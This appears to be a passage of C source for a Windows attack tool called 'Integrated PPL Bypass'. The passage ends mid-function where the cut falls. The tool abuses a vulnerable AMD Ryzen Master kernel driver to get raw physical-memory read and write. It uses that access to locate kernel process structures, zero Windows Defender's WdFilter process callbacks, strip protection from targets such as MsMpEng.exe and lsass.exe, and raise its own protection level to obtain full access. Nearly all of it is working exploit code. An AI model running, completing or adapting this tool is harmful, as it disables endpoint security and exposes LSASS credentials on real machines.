/*
 * step6_final.c — Integrated PPL Bypass (single tool, single scan)
 *
 * Chain:
 *   1. SHI (NtQuerySystemInformation class 16) → authoritative EPROCESS VA
 *   2. Find System EPROCESS (fast scan, stops at first match)
 *      → CR3 cross-validated: va_to_pa(cr3, sys_va) must equal sys_pa
 *   3. If CR3 valid: va_to_pa → get authoritative PA for target + self
 *   4. Fallback: single-pass 64KB-chunk RAM scan for EPROCESS + callback item
 *   5. Rapid loop (no re-scan):
 *        a. zero WdFilter PreOp  (cb_pa + 0x28)
 *        b. zero target EPROCESS.Protection
 *        c. elevate self to 0x31 (Antimalware/PPL)
 *        d. OpenProcess(PROCESS_ALL_ACCESS)
 *        e. restore self immediately; restore all on exit
 *
 * Usage:
 *   step6_final.exe MsMpEng.exe
 *   step6_final.exe lsass.exe
 *   step6_final.exe --pid 1234 MsMpEng.exe
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -o step6_final.exe step6_final.c \
 *       -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Driver ─────────────────────────────────────────────────────────────── */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* ── Physical ranges ─────────────────────────────────────────────────────── */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i=0;;i++) {
        vn=sizeof vname; vd=0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf=(uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0;i<g_nranges;i++)
        if (pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size)
            return 1;
    return 0;
}

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa, sz};
    uint32_t out_sz = 12+sz;
    uint8_t *out = (uint8_t*)calloc(1, out_sz); if (!out) return 0;
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                              &in, sizeof(in), out, out_sz, &got, NULL);
    if (ok && got>=12) memcpy(buf, out+12, sz);
    free(out); return ok && got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) return 0;
    uint32_t in_sz = 12+sz;
    uint8_t *in_buf = (uint8_t*)malloc(in_sz); if (!in_buf) return 0;
    *(uint64_t*)(in_buf) = pa; *(uint32_t*)(in_buf+8) = sz;
    memcpy(in_buf+12, data, sz);
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                              in_buf, in_sz, NULL, 0, &got, NULL);
    free(in_buf); return ok;
}

/* ── NtQSI module list ───────────────────────────────────────────────────── */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);

typedef struct {
    HANDLE  Section;
    PVOID   MappedBase;
    PVOID   ImageBase;
    ULONG   ImageSize;
    ULONG   Flags;
    USHORT  LoadOrderIndex;
    USHORT  InitOrderIndex;
    USHORT  LoadCount;
    USHORT  OffsetToFileName;
    CHAR    FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn = (PFN_NTQSI)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do { free(ml); ml=(MOD_LIST*)malloc(sz*=2); st=fn(11,ml,sz,NULL); }
    while (st==(NTSTATUS)0xC0000004L);
    if (st){free(ml);return NULL;}
    return ml;
}

static uint64_t get_ntoskrnl_va(char *path_out)
{
    MOD_LIST *ml=get_module_list(); if (!ml) return 0;
    uint64_t va=(uint64_t)ml->Modules[0].ImageBase;
    if (path_out){
        GetWindowsDirectoryA(path_out,MAX_PATH);
        strcat_s(path_out,MAX_PATH,"\\system32\\ntoskrnl.exe");
    }
    free(ml); return va;
}

static int get_module_range(const char *name, uint64_t *base_out, uint64_t *size_out)
{
    MOD_LIST *ml=get_module_list(); if (!ml) return 0;
    for (ULONG i=0;i<ml->NumberOfModules;i++){
        char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        if (_stricmp(fn,name)==0){
            *base_out=(uint64_t)ml->Modules[i].ImageBase;
            *size_out=ml->Modules[i].ImageSize;
            free(ml); return 1;
        }
    }
    free(ml); return 0;
}

/* ── SHI (SystemHandleInformation class 16) → EPROCESS kernel VA ─────────── */
typedef NTSTATUS (NTAPI *PFN_NTQSI_)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;       /* kernel VA of EPROCESS */
    ULONG  GrantedAccess;
    /* +4 bytes padding → struct = 24 bytes */
} SHI_ENTRY;
typedef struct { ULONG NumberOfHandles; SHI_ENTRY Handles[1]; } SHI;

static uint64_t shi_get_eproc_va(uint32_t target_pid)
{
    HANDLE hTarget = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);
    if (!hTarget) return 0;

    PFN_NTQSI_ fn = (PFN_NTQSI_)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!fn) { CloseHandle(hTarget); return 0; }

    ULONG sz=0x100000; SHI *buf=NULL; NTSTATUS st;
    do { free(buf); sz+=0x10000; buf=(SHI*)malloc(sz);
         if (!buf){CloseHandle(hTarget);return 0;}
         st=fn(16,buf,sz,NULL);
    } while (st==(NTSTATUS)0xC0000004L);

    uint64_t result=0;
    if (st==0){
        DWORD my_pid=GetCurrentProcessId();
        for (ULONG i=0;i<buf->NumberOfHandles;i++){
            if ((DWORD)buf->Handles[i].UniqueProcessId != my_pid) continue;
            if ((HANDLE)(ULONG_PTR)buf->Handles[i].HandleValue != hTarget) continue;
            result=(uint64_t)buf->Handles[i].Object;
            break;
        }
    }
    free(buf); CloseHandle(hTarget);
    return result;
}

/* ── PE export RVA ───────────────────────────────────────────────────────── */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if (fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    uint16_t ns=*(uint16_t*)(pe+elf+6),osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;
    #define R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
            uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
            uint32_t _fo=*(uint32_t*)(pe+_s+20);\
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}\
    }while(0)
    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if (!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if (!ffn||!fnm||!fod) return 0;
    for (uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if (!nfo||nfo>=fsz) continue;
        if (strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* ── ntoskrnl PA via 2MB NtBuildNumber scan ─────────────────────────────── */
static uint64_t find_ntoskrnl_pa(const char *path)
{
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if (hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);
    uint32_t rva=pe_export_rva(pe,fsz,"NtBuildNumber");
    free(pe); if (!rva) return 0;
    uint32_t ssd=*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF;
    uint32_t c0=ssd,c1=ssd|0xF0000000,c2=ssd|0xC0000000;
    const uint64_t STEP=0x200000ULL;
    for (int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1);
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for (uint64_t pa=base;pa<end;pa+=STEP){
            if (!pa_in_range(pa+rva,4)) continue;
            uint32_t val=0; if (!phys_read(pa+rva,&val,4)) continue;
            if (val!=c0&&val!=c1&&val!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            if (mz==0x5A4D) return pa;
        }
    }
    return 0;
}

/* ── EPROCESS layout (detect_offsets sets at runtime) ───────────────────── */
static uint32_t OFF_DTB   = 0x028;
static uint32_t OFF_PID   = 0x440;
static uint32_t OFF_FLINK = 0x448;
static uint32_t OFF_BLINK = 0x450;
static uint32_t OFF_TOKEN = 0x4B8;
static uint32_t OFF_PEB   = 0x550;
static uint32_t OFF_NAME  = 0x5A8;
static uint32_t OFF_PROT  = 0x87A;

static void detect_offsets(void)
{
    typedef LONG (WINAPI *pfnRtlGetVersion)(OSVERSIONINFOW*);
    OSVERSIONINFOW ov={sizeof ov};
    pfnRtlGetVersion fn=(pfnRtlGetVersion)
        GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlGetVersion");
    if (fn) fn(&ov);
    printf("[0] Windows build %lu → ", ov.dwBuildNumber);
    if (ov.dwBuildNumber >= 26100) {
        /* Win11 24H2+ EPROCESS layout changed significantly */
        OFF_PID   = 0x440;  /* verify with WinDbg: dt nt!_EPROCESS UniqueProcessId */
        OFF_FLINK = 0x448;
        OFF_BLINK = 0x450;
        OFF_TOKEN = 0x4B8;
        OFF_PEB   = 0x3E0;
        OFF_NAME  = 0x5A8;
        OFF_PROT  = 0x4FA;
        printf("Win11 24H2+  OFF_PROT=0x4FA\n\n");
    } else {
        printf("Win10/Win11 pre-24H2  OFF_PROT=0x87A\n\n");
    }
}

/* EPROC_SZ: bytes needed for one phys_read covering DTB..NAME+16 */
#define EPROC_SZ_MAX 0x5C0

/* ── 4-level page table walk (CR3 → PA) ─────────────────────────────────── */
static int va_to_pa(uint64_t cr3, uint64_t va, uint64_t *pa_out)
{
    uint64_t e=0, tbl=cr3&0x000FFFFFFFFFF000ULL;
    if (!phys_read(tbl+((va>>39)&0x1FF)*8,&e,8)||!(e&1)) return 0;
    tbl=e&0x000FFFFFFFFFF000ULL;
    if (!phys_read(tbl+((va>>30)&0x1FF)*8,&e,8)||!(e&1)) return 0;
    if (e&0x80){*pa_out=(e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFFULL);return 1;}
    tbl=e&0x000FFFFFFFFFF000ULL;
    if (!phys_read(tbl+((va>>21)&0x1FF)*8,&e,8)||!(e&1)) return 0;
    if (e&0x80){*pa_out=(e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFFULL);return 1;}
    tbl=e&0x000FFFFFFFFFF000ULL;
    if (!phys_read(tbl+((va>>12)&0x1FF)*8,&e,8)||!(e&1)) return 0;
    *pa_out=(e&0x000FFFFFFFFFF000ULL)|(va&0xFFFULL);
    return 1;
}

/* ── Cache eviction ──────────────────────────────────────────────────────────
 * MmMapIoSpace(MmNonCached) write đi thẳng DRAM, bypass CPU cache.
 * Kernel đọc qua WB (Write-Back) VA → thấy giá trị cũ trong L1/L2/L3.
 * Fix: thrash 64MB (> L3 của hầu hết Ryzen) để evict stale cache lines.
 * Sau thrash, kernel read sẽ miss → fetch từ DRAM → thấy giá trị ta đã write.
 */
/* ── Cache eviction approaches ───────────────────────────────────────────────
 * Problem: phys_write (MmNonCached) writes to DRAM, bypassing CPU cache.
 * Kernel reads from WB-cached VA → sees stale value.
 *
 * CLFLUSH (0F AE /7) is an unprivileged instruction on x86 that invalidates
 * a specific cache line by USER-MODE virtual address. BUT we need to flush
 * the KERNEL's cache line (by physical address), not our user-mode VA.
 *
 * We can't directly clflush kernel addresses from user mode. However, since
 * the cache is physically-tagged (PIPT on modern CPUs), ANY virtual address
 * that maps to the same physical page will flush the same cache line.
 *
 * Trick: map the target physical page into user-mode via shared memory or
 * VirtualAlloc at a specific PA... we can't do this easily on Windows.
 *
 * Fallback: thrash 256MB (bigger than any Ryzen L3) to guarantee eviction
 * by filling ALL cache sets. Since L3 is set-associative with limited ways,
 * accessing enough data forces eviction of cold lines including our target.
 */
#define THRASH_SIZE (256 * 1024 * 1024)
static void cache_evict(void)
{
    volatile uint8_t *buf = (volatile uint8_t *)
        VirtualAlloc(NULL, THRASH_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { Sleep(50); return; }
    /* Forward pass: write every cache line */
    for (size_t i = 0; i < THRASH_SIZE; i += 64) buf[i] = (uint8_t)(i >> 6);
    /* Reverse pass: re-read to maximize eviction coverage */
    volatile uint64_t sink = 0;
    for (size_t i = THRASH_SIZE; i >= 64; i -= 64) sink ^= buf[i-64];
    (void)sink;
    VirtualFree((LPVOID)buf, 0, MEM_RELEASE);
    /* Brief yield so other cores can flush their caches too */
    Sleep(10);
}

/* ── CR3-based callback finder ───────────────────────────────────────────────
 * Dùng CR3 của target process để translate VA→PA, tránh giả định ntoskrnl
 * contiguous trong physical memory (vốn là root cause của scan miss).
 *
 * Chain: target CR3 → va_to_pa(PsProcessType RVA) → đọc OBJECT_TYPE* VA
 *        → va_to_pa(CallbackList head) → walk linked list → tìm CALLBACK_ENTRY_ITEM
 *        có PreOp/PostOp trong WdFilter range.
 */
static int find_callback_via_cr3(
    uint64_t tgt_eproc_pa,
    uint64_t nt_va, uint32_t pst_rva,
    uint64_t wdf_base, uint64_t wdf_size,
    uint64_t *cb_pa_out, uint64_t *cb_preop_orig_out)
{
    /* Bước 1: đọc CR3 từ target EPROCESS */
    uint64_t cr3 = 0;
    if (!phys_read(tgt_eproc_pa + OFF_DTB, &cr3, 8) || !cr3 || (cr3 & 0xFFF)) {
        printf("    [-] Cannot read target CR3\n"); return 0;
    }
    printf("    Target CR3 = 0x%016llX\n", (unsigned long long)cr3);

    /* Bước 2: va_to_pa(cr3, nt_va + pst_rva) → PA đúng của PsProcessType symbol */
    uint64_t pst_va  = nt_va + pst_rva;
    uint64_t pst_pa  = 0;
    if (!va_to_pa(cr3, pst_va, &pst_pa)) {
        printf("    [-] va_to_pa(PsProcessType VA=0x%llX) failed\n",
               (unsigned long long)pst_va); return 0;
    }
    printf("    PsProcessType PA = 0x%016llX\n", (unsigned long long)pst_pa);

    /* Bước 3: đọc OBJECT_TYPE kernel VA (đây mới là giá trị đúng) */
    uint64_t objtype_va = 0;
    if (!phys_read(pst_pa, &objtype_va, 8) || objtype_va < 0xFFFF800000000000ULL) {
        printf("    [-] phys_read(PsProcessType) invalid: 0x%llX\n",
               (unsigned long long)objtype_va); return 0;
    }
    printf("    OBJECT_TYPE VA   = 0x%016llX  (corrected via CR3)\n",
           (unsigned long long)objtype_va);

    /* Bước 4: CallbackList head là LIST_ENTRY tại OBJECT_TYPE + 0x0C8 */
    uint64_t cblist_va = objtype_va + 0x0C8;
    uint64_t cblist_pa = 0;
    if (!va_to_pa(cr3, cblist_va, &cblist_pa)) {
        printf("    [-] va_to_pa(CallbackList VA=0x%llX) failed\n",
               (unsigned long long)cblist_va); return 0;
    }

    /* Bước 5: đọc Flink — con trỏ tới CALLBACK_ENTRY_ITEM đầu tiên */
    uint64_t flink_va = 0;
    if (!phys_read(cblist_pa, &flink_va, 8) || flink_va < 0xFFFF800000000000ULL) {
        printf("    [-] CallbackList Flink invalid: 0x%llX\n",
               (unsigned long long)flink_va); return 0;
    }

    /* Bước 6: walk list */
    printf("    Walking CallbackList (head VA=0x%llX)...\n",
           (unsigned long long)cblist_va);
    uint64_t cur_va = flink_va;
    for (int step = 0; step < 64 && cur_va != cblist_va; step++) {
        uint64_t item_pa = 0;
        if (!va_to_pa(cr3, cur_va, &item_pa)) {
            printf("    [%d] va_to_pa(0x%llX) FAIL\n", step,
                   (unsigned long long)cur_va); break;
        }

        uint8_t item[0x38] = {0};
        if (!phys_read(item_pa, item, sizeof item)) {
            printf("    [%d] phys_read FAIL at PA=0x%llX\n", step,
                   (unsigned long long)item_pa); break;
        }

        uint64_t next_va = *(uint64_t*)(item + 0x00);  /* Flink */
        uint32_t ops     = *(uint32_t*)(item + 0x10);
        uint64_t preop   = *(uint64_t*)(item + 0x28);
        uint64_t postop  = *(uint64_t*)(item + 0x30);

        int pre_wdf  = (preop  >= wdf_base && preop  < wdf_base + wdf_size);
        int post_wdf = (postop >= wdf_base && postop < wdf_base + wdf_size);

        printf("    [%d] PA=0x%016llX  ops=%u  preop=0x%016llX  %s\n",
               step, (unsigned long long)item_pa, ops,
               (unsigned long long)preop,
               (pre_wdf||post_wdf) ? "← WdFilter!" : "");

        if (pre_wdf || post_wdf) {
            *cb_pa_out         = item_pa;
            *cb_preop_orig_out = preop;
            return 1;
        }
        cur_va = next_va;
    }
    printf("    [-] No WdFilter entry found in CallbackList\n");
    return 0;
}

#define SCAN_CHUNK 0x10000
static uint8_t g_chunk[SCAN_CHUNK];

/* ── Find WdFilter image physical base bằng RAM scan ────────────────────────
 * On-disk WdFilter.sys có thể là phiên bản khác với cái đang chạy (sau update
 * chưa reboot) → không thể dùng disk bytes làm signature.
 *
 * Cách đúng: scan RAM tìm WdFilter PE header (MZ + PE32+ + SizeOfImage match).
 * Drivers kernel thường nằm trong first 512MB - 2GB physical.
 * Scan tại mỗi 4KB (page size) → tìm MZ header + validate.
 */
static uint64_t find_wdfilter_image_pa(uint64_t wdf_size)
{
    uint8_t page[0x1000];
    uint64_t scan_end = 0x80000000ULL;  /* first 2GB */

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t base = g_ranges[ri].base;
        uint64_t end  = g_ranges[ri].base + g_ranges[ri].size;
        if (end > scan_end) end = scan_end;

        for (uint64_t pa = (base + 0xFFF) & ~0xFFFULL; pa + 0x1000 <= end; pa += 0x1000) {
            if (!phys_read(pa, page, 0x1000)) continue;

            /* Quick filter: MZ magic */
            if (page[0] != 'M' || page[1] != 'Z') continue;

            /* e_lfanew must be sane */
            int32_t elf = *(int32_t*)(page + 0x3C);
            if (elf < 0x40 || elf + 0x58 > 0x1000) continue;

            /* PE32+ signature: 0x00004550 at elf, Machine=0x8664, Magic=0x020B */
            if (*(uint32_t*)(page + elf) != 0x00004550) continue;
            if (*(uint16_t*)(page + elf + 4) != 0x8664) continue;    /* AMD64 */
            if (*(uint16_t*)(page + elf + 24) != 0x020B) continue;   /* PE32+ */

            /* SizeOfImage must match wdf_size (from module list) */
            uint32_t soi = *(uint32_t*)(page + elf + 0x50);
            if (soi != (uint32_t)wdf_size) continue;

            printf("    [+] WdFilter image found at PA=0x%016llX  SizeOfImage=0x%X\n",
                   (unsigned long long)pa, soi);
            return pa;
        }
    }
    return 0;
}

static uint64_t find_wdfilter_preop_pa(uint64_t preop_va, uint64_t wdf_base_va,
                                        uint64_t wdf_size, uint8_t *orig_byte_out)
{
    *orig_byte_out = 0;
    uint64_t preop_rva = preop_va - wdf_base_va;
    printf("    preop_rva = 0x%llX\n", (unsigned long long)preop_rva);

    /* Tìm WdFilter image base bằng RAM scan (không dùng disk file vì có thể
     * khác phiên bản với image đang chạy sau Windows Update chưa reboot) */
    printf("    Scanning first 2GB for WdFilter PE header (SizeOfImage=0x%llX)...\n",
           (unsigned long long)wdf_size);
    uint64_t wdf_pa = find_wdfilter_image_pa(wdf_size);
    if (!wdf_pa) {
        printf("    [-] WdFilter image not found in first 2GB\n");
        return 0;
    }

    /* preop_pa = wdf_pa + preop_rva (image là contiguous trong physical memory
     * vì được loader cấp phát 1 block liên tục lúc boot) */
    uint64_t preop_pa = wdf_pa + preop_rva;
    printf("    preop_pa = wdf_pa(0x%llX) + rva(0x%llX) = 0x%016llX\n",
           (unsigned long long)wdf_pa,
           (unsigned long long)preop_rva,
           (unsigned long long)preop_pa);

    if (!pa_in_range(preop_pa, 16)) {
        printf("    [-] preop_pa not in physical ranges\n");
        return 0;
    }

    if (!phys_read(preop_pa, orig_byte_out, 1)) {
        printf("    [-] phys_read(preop_pa) failed\n");
        return 0;
    }
    printf("    orig_byte = 0x%02X\n", *orig_byte_out);
    return preop_pa;
}

/* ── Verify phys_write bằng read-back ───────────────────────────────────────
 * MmMapIoSpace có thể trả về NULL cho một số PA → write silent fail.
 * phys_write_verified() trả về 1 nếu write thành công VÀ readback xác nhận.
 */
static int phys_write_verified(uint64_t pa, const void *data, uint32_t sz)
{
    if (!phys_write(pa, data, sz)) return 0;
    uint8_t buf[8] = {0};
    if (!phys_read(pa, buf, sz < 8 ? sz : 8)) return 0;
    return memcmp(buf, data, sz < 8 ? sz : 8) == 0;
}

/* ── Toolhelp PID lookup ─────────────────────────────────────────────────── */
static uint32_t get_pid(const char *name)
{
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (snap==INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe={sizeof pe}; uint32_t found=0;
    if (Process32First(snap,&pe)) do {
        if (_stricmp(pe.szExeFile,name)==0){found=pe.th32ProcessID;break;}
    } while (Process32Next(snap,&pe));
    CloseHandle(snap); return found;
}

typedef struct {
    uint64_t pa;
    uint64_t cr3;
    uint64_t flink;
    uint32_t pid;
    uint8_t  prot;
    char     name[16];
} EprocEntry;

/* ── Fast System EPROCESS scan (64KB chunks, stops on first valid match) ─── */

static int scan_system_eproc(EprocEntry *out)
{
    uint8_t ep[EPROC_SZ_MAX];
    for (int ri=0;ri<g_nranges;ri++){
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for (uint64_t cpa=g_ranges[ri].base;cpa<end;cpa+=SCAN_CHUNK){
            uint64_t csz=end-cpa; if (csz>SCAN_CHUNK) csz=SCAN_CHUNK;
            if (!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for (uint64_t off=0;off+8<=csz;off+=8){
                if (g_chunk[off]!='S') continue;
                uint64_t abs=cpa+off;
                uint64_t epa=abs-OFF_NAME;
                if (!pa_in_range(epa,EPROC_SZ_MAX)) continue;
                if (epa>=cpa && epa+EPROC_SZ_MAX<=cpa+csz)
                    memcpy(ep, g_chunk+(epa-cpa), EPROC_SZ_MAX);
                else
                    if (!phys_read(epa,ep,EPROC_SZ_MAX)) continue;
                uint64_t pid=*(uint64_t*)(ep+OFF_PID);
                if (pid!=4) continue;
                if (memcmp(ep+OFF_NAME,"System\0",7)!=0) continue;
                uint64_t token=*(uint64_t*)(ep+OFF_TOKEN);
                uint64_t cr3  =*(uint64_t*)(ep+OFF_DTB);
                uint64_t flink=*(uint64_t*)(ep+OFF_FLINK);
                uint64_t blink=*(uint64_t*)(ep+OFF_BLINK);
                uint64_t peb  =*(uint64_t*)(ep+OFF_PEB);
                if ((token&~0xFULL)<0xFFFF800000000000ULL) continue;
                if (!cr3||(cr3&0xFFF)||cr3>0x10000000000ULL) continue;
                if (flink<0xFFFF800000000000ULL||blink<0xFFFF800000000000ULL) continue;
                if (peb!=0) continue;
                out->pa=epa; out->cr3=cr3; out->flink=flink; out->pid=4;
                memcpy(out->name,ep+OFF_NAME,15); out->name[15]=0;
                phys_read(epa+OFF_PROT,&out->prot,1);
                return 1;
            }
        }
    }
    return 0;
}

/* ── Single-pass 64KB scan: collect ALL WdFilter callbacks + EPROCESS ────────
 * Không dừng ở callback đầu tiên — WdFilter register cho cả PsProcessType VÀ
 * PsThreadType. Cần zero TẤT CẢ, nếu không Process type callback vẫn active.
 */
#define MAX_CBS 16
static void single_pass_scan(
    uint64_t  objtype_va, uint64_t list_head_va,
    uint64_t  wdf_base,   uint64_t wdf_size,
    uint64_t  nt_va,      uint64_t nt_size,
    uint32_t  target_pid, const char *target_name,
    uint32_t  self_pid,
    uint64_t  cb_pa_arr[], uint64_t cb_preop_arr[], int *n_cbs_out,
    EprocEntry *tgt_out, EprocEntry *self_out)
{
    *n_cbs_out = 0;
    uint8_t ep[EPROC_SZ_MAX];
    uint64_t last_prog=0;

    for (int ri=0;ri<g_nranges;ri++){
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for (uint64_t cpa=g_ranges[ri].base;cpa<end;cpa+=SCAN_CHUNK){
            if (cpa-last_prog>=0x40000000ULL){
                printf("  [ %5llu MB ]  cb=%s  tgt=%s  self=%s\n",
                       (unsigned long long)(cpa>>20),
                       (*n_cbs_out>0)?"OK":"--",
                       tgt_out->pa ?"OK":"--",
                       self_out->pa?"OK":"--");
                last_prog=cpa;
            }
            uint64_t csz=end-cpa; if (csz>SCAN_CHUNK) csz=SCAN_CHUNK;
            if (!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;

            /* ── Callback search: collect ALL WdFilter callbacks ────────────
             * Anchor: preop ∈ [wdf_base, wdf_base+wdf_size).
             * KHÔNG dừng sau match đầu tiên — WdFilter đăng ký cho cả
             * PsProcessType VÀ PsThreadType. Zero chỉ một cái là KHÔNG đủ.
             * ─────────────────────────────────────────────────────────────── */
            if (wdf_base && wdf_size && *n_cbs_out < MAX_CBS) {
                for (uint64_t off=0x28; off+0x10<=csz; off+=8){
                    if (*n_cbs_out >= MAX_CBS) break;
                    uint64_t preop=*(uint64_t*)(g_chunk+off);
                    if (preop<wdf_base||preop>=wdf_base+wdf_size) continue;

                    uint64_t flink =*(uint64_t*)(g_chunk+off-0x28);
                    uint64_t blink =*(uint64_t*)(g_chunk+off-0x20);
                    uint32_t ops   =*(uint32_t*)(g_chunk+off-0x18);
                    uint64_t cbent =*(uint64_t*)(g_chunk+off-0x10);
                    uint64_t objt  =*(uint64_t*)(g_chunk+off-0x08);
                    uint64_t postop=*(uint64_t*)(g_chunk+off+0x08);

                    if (flink <0xFFFF800000000000ULL) continue;
                    if (blink <0xFFFF800000000000ULL) continue;
                    if (ops<1||ops>3) continue;
                    if (cbent <0xFFFF800000000000ULL) continue;
                    if (objt  <0xFFFF800000000000ULL) continue;
                    if (postop && postop<0xFFFF800000000000ULL) continue;
                    if (flink==preop||blink==preop) continue;

                    /* Dedup by PA — tránh thêm cùng một entry nhiều lần */
                    uint64_t entry_pa = cpa+(off-0x28);
                    int dup=0;
                    for (int d=0;d<*n_cbs_out;d++)
                        if (cb_pa_arr[d]==entry_pa){dup=1;break;}
                    if (dup) continue;

                    cb_pa_arr[*n_cbs_out]    = entry_pa;
                    cb_preop_arr[*n_cbs_out] = preop;
                    (*n_cbs_out)++;

                    printf("\n  [CALLBACK#%d] PA=0x%016llX  ops=%u  objt=0x%llX\n"
                           "               preop=0x%llX (WdFilter+0x%llX)\n",
                           *n_cbs_out,
                           (unsigned long long)entry_pa, ops,
                           (unsigned long long)objt,
                           (unsigned long long)preop,
                           (unsigned long long)(preop-wdf_base));
                }
            }

            /* ── Method B: Flink==Blink==list_head_va ───────────────────── */
            if (list_head_va && *n_cbs_out < MAX_CBS) {
                for (uint64_t off=0;off+0x38<=csz;off+=8){
                    if (*(uint64_t*)(g_chunk+off+0x00)!=list_head_va) continue;
                    if (*(uint64_t*)(g_chunk+off+0x08)!=list_head_va) continue;
                    uint32_t ops  =*(uint32_t*)(g_chunk+off+0x10);
                    uint64_t cbent=*(uint64_t*)(g_chunk+off+0x18);
                    uint64_t objt =*(uint64_t*)(g_chunk+off+0x20);
                    uint64_t preop=*(uint64_t*)(g_chunk+off+0x28);
                    if (ops<1||ops>3) continue;
                    if (cbent<0xFFFF800000000000ULL) continue;
                    if (objt <0xFFFF800000000000ULL) continue;
                    int in_wdf=(preop>=wdf_base&&preop<wdf_base+wdf_size);
                    if (!in_wdf) continue;
                    uint64_t entry_pa2=cpa+off;
                    int dup2=0;
